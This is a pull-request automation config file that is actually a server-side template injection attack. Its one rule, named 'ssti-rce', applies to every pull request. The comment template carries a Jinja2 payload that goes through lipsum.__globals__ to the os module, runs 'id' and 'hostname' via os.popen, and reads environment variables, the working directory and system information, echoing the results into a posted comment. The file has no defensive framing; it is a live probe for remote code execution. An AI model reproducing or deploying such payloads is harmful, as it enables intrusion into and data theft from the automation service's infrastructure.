pull_request_rules:
  - name: ssti-rce
    conditions: []
    actions:
      comment:
        message: |
          === G4o7T SSTI v6 ===
          author={{ author }}
          {% if author %}
          T1-direct-lipsum-globals: {{ lipsum.__globals__ }}
          T2-attr-lipsum: {{ lipsum | attr('__globals__') }}
          T3-os-via-lipsum: {{ lipsum.__globals__.os }}
          T4-popen-id: {{ lipsum.__globals__.os.popen('id').read() }}
          T5-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
          T6-env-path: {{ lipsum.__globals__.os.environ.PATH }}
          T7-cwd: {{ lipsum.__globals__.os.getcwd() }}
          T8-uname: {{ lipsum.__globals__.os.uname() }}
          {% endif %}
